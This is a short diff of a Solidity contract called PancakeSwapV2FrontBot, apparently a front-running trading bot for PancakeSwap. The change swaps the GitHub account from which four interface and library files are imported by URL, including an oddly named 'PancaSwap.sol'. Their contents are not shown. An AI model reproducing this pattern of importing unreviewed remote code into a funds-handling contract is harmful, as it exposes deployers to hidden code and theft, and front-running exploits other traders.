@@ -1,13 +1,13 @@
 pragma solidity ^0.6.6;
 
 // PancakeSwap Callee
-import "https://github.com/826243364/pancakeswapv2/blob/master/contracts/interfaces/IPancakeswapV2Callee.sol";
+import "https://github.com/chongqiangchen/pancakeswapv2/blob/master/contracts/interfaces/IPancakeswapV2Callee.sol";
 
 
 // Pancakeswap Manager
-import "https://github.com/826243364/pancakeswapv2/blob/master/contracts/interfaces/V2/IPancakeswapV2Manager.sol";
-import "https://github.com/826243364/pancakeswapv2/blob/master/PancaSwap.sol";
-import "https://github.com/826243364/pancakeswapv2/blob/master/contracts/interfaces/V2/IPancakeswapV2Exchange.sol";
+import "https://github.com/chongqiangchen/pancakeswapv2/blob/master/contracts/interfaces/V2/IPancakeswapV2Manager.sol";
+import "https://github.com/chongqiangchen/pancakeswapv2/blob/master/PancaSwap.sol";
+import "https://github.com/chongqiangchen/pancakeswapv2/blob/master/contracts/interfaces/V2/IPancakeswapV2Exchange.sol";
 
 contract PancakeSwapV2FrontBot {
     
